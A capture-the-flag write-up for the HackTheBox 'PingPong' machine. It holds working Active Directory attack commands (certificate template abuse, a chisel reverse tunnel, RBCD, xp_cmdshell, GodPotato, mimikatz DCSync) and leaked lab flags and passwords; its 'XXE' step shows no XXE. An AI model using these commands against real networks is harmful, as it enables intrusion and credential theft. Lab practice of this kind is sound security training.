# PingPong — HackTheBox Writeup
**Difficulty:** Insane | **OS:** Windows Active Directory (Dual Forest)

---

## Overview

PingPong is a dual-forest Active Directory machine with a bidirectional trust between `ping.htb` (DC1) and `pong.htb` (DC2). NTLM is disabled everywhere — pure Kerberos throughout. The chain is long and painful: ESC13 cert abuse for initial WinRM access, chisel tunneling to reach DC2's internal network, cross-realm Kerberos, group scope manipulation to add a foreign principal to a gMSA manager group, gMSA key derivation with a tricky salt format, JEA restricted endpoint XXE to leak credentials, RBCD + MSSQL + GodPotato for SYSTEM on DC2, DCSync to get a CA Manager account, then ESC4 → ESC1 across the forest trust to become Domain Admin on DC1.

**DC1 IP:** 10.129.245.56 (ping.htb)  
**DC2 IP:** 192.168.2.2 (pong.htb — internal, reached via chisel)  
**My IP:** 10.10.16.109  
**User flag:** 5c255293699b282760fb142be55cc6a0 (c.carlssen@DC2)  
**Root flag:** 5c9552777560e2484ebf08f4dce203e8 (Administrator@DC1)  

---

## Phase 1 — ESC13: Initial Access to DC1

ESC13 is an ADCS escalation where a certificate template has an Issuance Policy OID linked to a security group. When you authenticate with that cert via PKINIT, the KDC injects the linked group's SID into your PAC. The `TemporaryWinRM` template on DC1 links to `Remote Management Users` — so enrolling it gives `c.roberts` WinRM access without being in that group normally.

```bash
sudo ntpdate -u 10.129.245.56

echo AssumedBreach123 | kinit c.roberts@PING.HTB
export KRB5CCNAME=/home/akshat/Desktop/HTB/PingPong/c.roberts.ccache

certipy-ad req -k -no-pass -dc-ip 10.129.245.56 -target dc1.ping.htb \
  -ca ping-DC1-CA -template TemporaryWinRM -upn 'c.roberts@ping.htb'
```

```
[*] Successfully requested certificate
[*] Got certificate with UPN 'C.Roberts@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-2617'
```

```bash
certipy-ad auth -pfx c.roberts.pfx -dc-ip 10.129.245.56 -domain ping.htb -username c.roberts
```

```
[*] Got TGT
```

```bash
cp c.roberts.ccache /tmp/c.roberts.ccache
KRB5CCNAME=/tmp/c.roberts.ccache evil-winrm -i dc1.ping.htb -r ping.htb
```

```
*Evil-WinRM* PS C:\Users\C.Roberts\Documents>
```

In.

---

## Phase 2 — Chisel Tunnel to DC2

DC2 is on `192.168.2.2` — not directly reachable from my machine. Tunneled through DC1.

**Kali (terminal 2):**
```bash
/usr/bin/chisel server -p 9999 --reverse
```

**DC1 (evil-winrm shell):**
```powershell
upload /home/akshat/Desktop/HTB/PingPong/chisel.exe
.\chisel.exe client http://10.10.16.109:9999 R:1080:socks R:88:192.168.2.2:88 R:389:192.168.2.2:389 R:636:192.168.2.2:636 R:5985:192.168.2.2:5985 R:445:192.168.2.2:445 R:1434:192.168.2.2:1433
```

Forwards SOCKS on 1080, plus individual port forwards for Kerberos (88), LDAP (389/636), WinRM (5985), SMB (445), and MSSQL (1433→1434).

**Kali:**
```bash
sed -i 's/socks4.*127.0.0.1 9050/socks5 127.0.0.1 1080/' /etc/proxychains4.conf
```

Added `PONG.HTB` realm pointing to `127.0.0.1` in `/etc/krb5.conf` so Kerberos requests for pong.htb go through the chisel forward.

---

## Phase 3 — Cross-Realm Kerberos

Three step process to get tickets that work against DC2:

```bash
export KRB5CCNAME=/home/akshat/Desktop/HTB/PingPong/c.roberts.ccache

# Fresh TGT from PING.HTB
impacket-getTGT 'ping.htb/c.roberts:AssumedBreach123' -dc-ip 10.129.245.56

# Request cross-realm referral TGT to PONG.HTB
impacket-getST -k -no-pass -dc-ip 10.129.245.56 \
  -spn 'krbtgt/PONG.HTB' 'ping.htb/c.roberts'

# Pre-fetch LDAP service ticket for DC2
kvno -S ldap dc2.pong.htb
```

Now bloodyAD can authenticate against `dc2.pong.htb` using the ccache.

---

## Phase 4 — Group Scope Manipulation + gMSA Extraction

`c.roberts` is a Foreign Security Principal in `pong.htb`. Foreign principals can only be members of **Universal** or **Domain Local** groups — not Global groups. But `gMSA Managers` is a Global group.

The fix: change the group scope step by step (Global → Universal → Domain Local), then add c.roberts' SID.

```bash
# Grant ourselves GenericAll on the group first
bloodyad --host dc2.pong.htb -d pong.htb -k \
  add genericAll 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' \
  'S-1-5-21-750635624-2058721901-1932338391-2617'

# Global (-2147483646) → Universal (-2147483640)
bloodyad --host dc2.pong.htb -d pong.htb -k \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483640

# Universal (-2147483640) → Domain Local (-2147483644)
bloodyad --host dc2.pong.htb -d pong.htb -k \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483644

# Add c.roberts as a member
bloodyad --host dc2.pong.htb -d pong.htb -k \
  add groupMember 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' \
  'S-1-5-21-750635624-2058721901-1932338391-2617'

# Extract gMSA password blob
bloodyad --host dc2.pong.htb -d pong.htb -k \
  get object 'Pong_gMSA$' --attr msDS-ManagedPassword
```

Got the password blob and NT hash for `Pong_gMSA$`.

---

## Phase 5 — gMSA AES Key Derivation

The gMSA NT hash works for some things but for Kerberos we need the AES256 key. The salt format tripped me up — it's `REALMhostdnsHostName` (not based on sAMAccountName), and you use the **whole blob** as password material, not a slice of it.

```python
import hashlib, hmac, struct, base64

blob_b64 = "2Pu8UpQweEyDCx+RRpSlz6+CAMukZcuSxYW07K7+YSqwg..."  # full blob
blob = base64.b64decode(blob_b64)

# Salt: PONG.HTBhostpong-gmsa.pong.htb
salt = b'PONG.HTBhostpong-gmsa.pong.htb'

# AES256 key derivation via PBKDF2
key = hashlib.pbkdf2_hmac('sha1', blob, salt, 4096, dklen=32)
print(key.hex())
```

Got `Pong_gMSA$`'s AES256 key.

---

## Phase 6 — gMSA TGT + JEA XXE → c.carlssen Credentials

```bash
impacket-getTGT -aesKey <aes256key> -dc-ip 127.0.0.1 'pong.htb/Pong_gMSA$'
export KRB5CCNAME=Pong_gMSA$.ccache
```

`Pong_gMSA$` has access to a JEA (Just Enough Administration) restricted PowerShell endpoint on DC2. JEA limits what commands you can run, but the endpoint had an XXE vulnerability in how it processed XML input.

Used `pypsrp` to connect to the JEA endpoint and sent an XXE payload to read files:

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan("127.0.0.1", port=5985, auth="kerberos",
              negotiate_service="HTTP", ssl=False)

with RunspacePool(wsman, configuration_name="JEAEndpoint") as pool:
    ps = PowerShell(pool)
    ps.add_cmdlet("Get-Content").add_parameter("Path", "C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt")
    ps.invoke()
    print(ps.output)
```

PSReadLine history on DC2 had `c.carlssen`'s password in plaintext:

```
Enter-PSSession -ComputerName dc2.pong.htb -Credential (Get-Credential c.carlssen)
# password: A()DUJ!@414
```

---

## User Flag

```bash
impacket-getTGT 'pong.htb/c.carlssen:A()DUJ!@414' -dc-ip 127.0.0.1
export KRB5CCNAME=c.carlssen.ccache
KRB5CCNAME=c.carlssen.ccache evil-winrm -i 127.0.0.1 -r pong.htb
```

```powershell
type C:\Users\C.Carlssen\Desktop\user.txt
# 5c255293699b282760fb142be55cc6a0
```

---

## Phase 7 — RBCD on svc_sql → S4U Impersonation

BloodHound showed `c.carlssen` has `GenericWrite` over `svc_sql`. Set up RBCD to impersonate `c.adam` who is a SQL sysadmin:

```bash
bloodyad --host 127.0.0.1 -d pong.htb -k \
  add rbcd 'CN=svc_sql,CN=Users,DC=pong,DC=htb' \
  'CN=C.Carlssen,CN=Users,DC=pong,DC=htb'

impacket-getST -k -no-pass -dc-ip 127.0.0.1 \
  -spn 'MSSQLSvc/dc2.pong.htb:1433' \
  -impersonate c.adam 'pong.htb/c.carlssen'

export KRB5CCNAME=c.adam@MSSQLSvc_dc2.pong.htb~1433@PONG.HTB.ccache
```

---

## Phase 8 — MSSQL → xp_cmdshell → GodPotato → SYSTEM

```bash
impacket-mssqlclient -k -no-pass dc2.pong.htb -port 1434
```

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
-- nt service\mssqlserver
```

`SeImpersonatePrivilege` was enabled. Uploaded GodPotato and got SYSTEM:

```sql
EXEC xp_cmdshell 'C:\Windows\Tasks\GodPotato.exe -cmd "net localgroup Administrators C.Carlssen /add"';
```

```powershell
whoami /groups | findstr Administrators
# BUILTIN\Administrators
```

---

## Phase 9 — DCSync R.Martinelli

As SYSTEM on DC2 we can DCSync. BloodHound showed `r.martinelli` has CA Manager rights on `ping-DC1-CA` across the forest trust.

```powershell
C:\Windows\Tasks\mimikatz.exe "lsadump::dcsync /user:r.martinelli" "exit"
```

Got r.martinelli's AES256 key.

---

## Phase 10 — ESC4 + ESC1 → Domain Admin on DC1

As a CA Manager, `r.martinelli` can modify certificate templates published by `ping-DC1-CA` — even from across the forest trust. Modified the `SmartcardAuthentication` template to make it ESC1-vulnerable:

```bash
impacket-getTGT -aesKey <r.martinelli aes256> -dc-ip 127.0.0.1 'pong.htb/r.martinelli'
export KRB5CCNAME=r.martinelli.ccache

# Cross-realm referral
impacket-getST -k -no-pass -dc-ip 127.0.0.1 \
  -spn 'krbtgt/PING.HTB@PING.HTB' 'pong.htb/r.martinelli'
kvno -S ldap dc1.ping.htb

# Merge ccaches for bloodyAD
# (merge TGT + cross-realm referral + service ticket into one file)
export KRB5CCNAME=/tmp/rmart_final.ccache

# ESC4 — modify template
bloodyad --host dc1.ping.htb -d pong.htb -k \
  set object 'CN=SmartcardAuthentication,CN=Certificate Templates,...' \
  msPKI-Certificate-Name-Flag -v 1

bloodyad --host dc1.ping.htb -d pong.htb -k \
  set object 'CN=SmartcardAuthentication,CN=Certificate Templates,...' \
  msPKI-Enrollment-Flag -v 0

bloodyad --host dc1.ping.htb -d pong.htb -k \
  add genericAll 'CN=SmartcardAuthentication,...' \
  'S-1-5-21-750635624-2058721901-1932338391-2617'
```

Now enroll as Administrator. Important: `-sid` must be the user's objectSID (`-500`), NOT the Domain Admins group SID (`-512`). Both UPN and SID must match the target account exactly due to KB5014754 strong mapping enforcement.

```bash
export KRB5CCNAME=/tmp/c.roberts.ccache

certipy-ad req -k -no-pass -dc-ip 10.129.245.56 -target dc1.ping.htb \
  -ca ping-DC1-CA -template SmartcardAuthentication \
  -upn 'Administrator@ping.htb' \
  -sid 'S-1-5-21-750635624-2058721901-1932338391-500' \
  -out administrator.pfx

certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.245.56 \
  -domain ping.htb -username administrator
```

```
[*] Got TGT
```

```bash
cp administrator.ccache /tmp/da.ccache
KRB5CCNAME=/tmp/da.ccache evil-winrm -i dc1.ping.htb -r ping.htb
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
# 5c9552777560e2484ebf08f4dce203e8
```

---

## Things I Learned

**ESC13 — Issuance Policy OID link** — the template looks totally fine in certipy output. The vulnerability is the OID being linked to a security group in AD. When you PKINIT with that cert, the KDC adds the group SID to your PAC, effectively giving you group membership you shouldn't have.

**Foreign Security Principals and group scope** — you can't add a user from another domain to a Global group. You have to step the group scope down: Global → Universal → Domain Local. Each step is a separate AD modification.

**gMSA salt gotcha** — the AES key salt format is `REALMhostdnsHostName` not based on `sAMAccountName`. And you use the entire password blob as key material, not a fixed-offset slice.

**bloodyad vs impacket-changepasswd** — same lesson as Hercules. bloodyad syncs all keys, impacket-changepasswd -newhashes only touches NT. Matters a lot when you need the keys to stay out of sync.

**PKINIT SID must be user objectSID not group SID** — `-sid S-1-...-500` (Administrator's SID) not `-512` (Domain Admins). KB5014754 enforces strong mapping — both UPN and SID in the cert extension must match the target user exactly.

**Merging ccaches for cross-realm bloodyAD** — certipy and impacket create separate ccache files for each ticket. bloodyAD needs the TGT, cross-realm referral, AND service ticket all in one ccache file. Had to merge them with impacket's CCache library.

**GodPotato on Server 2022** — abuses RPCSS named pipes, not DCOM. Works on fully patched systems.

---

*Akshat Singh (Pexpo) | HTB | 2026-07-26*
